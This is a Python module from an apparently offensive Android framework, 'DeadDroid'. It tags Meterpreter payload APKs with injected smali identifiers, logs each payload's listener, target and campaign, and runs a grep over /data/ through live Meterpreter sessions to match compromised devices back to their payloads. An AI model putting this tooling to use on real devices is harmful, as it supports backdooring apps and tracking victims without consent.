"""
Payload DNA System — unique to DeadDroid.

Every generated payload gets a unique "DNA tag" — a hidden identifier
embedded inside the APK's smali resources. When a session opens,
DeadDroid reads the DNA from the Meterpreter session to instantly know:
  - Which payload file generated this session
  - Which target was it deployed against
  - Which campaign it belongs to
  - When it was generated

No other Android pentest tool tracks payloads this way.
"""

import uuid
import time
import json
from pathlib import Path
from typing import Optional
from rich.console import Console
from rich.table import Table
from rich import box
from core.utils import WORKSPACE, save_json, load_json, log_event

console = Console()

DNA_REGISTRY = WORKSPACE / "payload_dna.json"
DNA_SMALI_CLASS = "com/deaddroid/dna/Tag"


def _load_registry() -> dict:
    return load_json(DNA_REGISTRY)


def _save_registry(reg: dict):
    save_json(DNA_REGISTRY, reg)


def generate_dna(
    payload_path: str,
    lhost: str,
    lport: int,
    campaign_id: str = "",
    target_name: str = "",
    notes: str = "",
) -> str:
    """Create a unique DNA tag and register it."""
    dna_id = str(uuid.uuid4()).replace("-", "")[:16].upper()

    entry = {
        "dna":          dna_id,
        "payload":      payload_path,
        "lhost":        lhost,
        "lport":        lport,
        "campaign_id":  campaign_id,
        "target":       target_name,
        "notes":        notes,
        "created":      time.strftime("%Y-%m-%d %H:%M:%S"),
        "session_seen": None,
        "session_id":   None,
    }

    reg = _load_registry()
    reg[dna_id] = entry
    _save_registry(reg)

    log_event(f"DNA registered: {dna_id} → {payload_path}")
    console.print(f"[green]✔ Payload DNA:[/] [bold yellow]{dna_id}[/]")
    return dna_id


def build_dna_smali(dna_id: str) -> str:
    """
    Returns a smali class that stores the DNA string as a static field.
    Injected into the APK during binding so DeadDroid can read it back.
    """
    return f""".class public L{DNA_SMALI_CLASS};
.super Ljava/lang/Object;
.source "Tag.java"

# DNA: {dna_id}

.field public static final DNA_ID:Ljava/lang/String; = "{dna_id}"

.method public constructor <init>()V
    .registers 1
    invoke-direct {{p0}}, Ljava/lang/Object;-><init>()V
    return-void
.end method
"""


def inject_dna_into_apk_dir(apk_smali_dir: Path, dna_id: str) -> bool:
    """Write DNA smali class into a decompiled APK directory."""
    target_dir = apk_smali_dir / "smali" / "com" / "deaddroid" / "dna"
    target_dir.mkdir(parents=True, exist_ok=True)

    smali_content = build_dna_smali(dna_id)
    smali_file    = target_dir / "Tag.smali"
    smali_file.write_text(smali_content)

    console.print(f"[green]✔ DNA tag injected:[/] {dna_id} → {smali_file}")
    return True


def read_dna_from_session(session_id: int) -> Optional[str]:
    """
    Attempt to read the DNA tag from a live Meterpreter session.
    Looks for the smali field value via shell command.
    """
    try:
        from core.session_mgr import run_meterpreter
        # Try to read the DNA from the APK's assets or class via shell
        cmd = f"shell grep -r '{DNA_SMALI_CLASS.replace('/',  '.')}' /data/ 2>/dev/null | head -5"
        out = run_meterpreter(session_id, cmd)
        if out and len(out) > 16:
            # Scan output for a 16-char hex DNA pattern
            import re
            matches = re.findall(r'[0-9A-F]{16}', out)
            if matches:
                return matches[0]
    except Exception:
        pass
    return None


def identify_session(session_id: int) -> Optional[dict]:
    """Try to match a live session to a registered DNA payload."""
    dna_id = read_dna_from_session(session_id)
    if not dna_id:
        return None

    reg = _load_registry()
    entry = reg.get(dna_id)
    if entry:
        entry["session_seen"] = time.strftime("%Y-%m-%d %H:%M:%S")
        entry["session_id"]   = session_id
        reg[dna_id] = entry
        _save_registry(reg)
        log_event(f"DNA match: session {session_id} ← DNA {dna_id} (payload={entry['payload']})")
        return entry

    return None


def show_dna_registry():
    reg = _load_registry()
    if not reg:
        console.print("[yellow]No DNA records.[/]")
        return

    t = Table(title="[bold cyan]Payload DNA Registry[/]", box=box.SIMPLE_HEAVY, show_lines=True)
    t.add_column("DNA ID",     style="bold yellow", width=18)
    t.add_column("Payload",    style="cyan")
    t.add_column("LHOST:PORT", style="green")
    t.add_column("Target",     style="white")
    t.add_column("Campaign",   style="magenta")
    t.add_column("Session",    style="red")
    t.add_column("Created",    style="dim")

    for dna_id, e in reg.items():
        t.add_row(
            dna_id,
            str(e.get("payload",""))[-30:],
            f"{e.get('lhost','')}:{e.get('lport','')}",
            e.get("target",""),
            e.get("campaign_id",""),
            str(e.get("session_id","—")),
            e.get("created",""),
        )
    console.print(t)


def interactive_dna():
    console.rule("[bold cyan]Payload DNA Tracker[/]")

    menu = {
        "1": "Show DNA registry",
        "2": "Identify session by DNA",
        "3": "Back",
    }
    from rich.table import Table
    m = Table(show_header=False, box=None)
    for k, v in menu.items():
        m.add_row(f"[yellow][{k}][/]", v)
    console.print(m)

    from rich.prompt import Prompt, IntPrompt
    choice = Prompt.ask("Select", choices=list(menu.keys()), default="3")

    if choice == "1":
        show_dna_registry()
    elif choice == "2":
        sid  = IntPrompt.ask("Session ID")
        info = identify_session(sid)
        if info:
            console.print(f"\n[bold green]✔ DNA Match Found![/]")
            console.print(f"  DNA ID:   [yellow]{info['dna']}[/]")
            console.print(f"  Payload:  {info['payload']}")
            console.print(f"  Target:   {info['target']}")
            console.print(f"  Campaign: {info['campaign_id']}")
            console.print(f"  Created:  {info['created']}")
        else:
            console.print("[yellow]No DNA match found for this session.[/]")
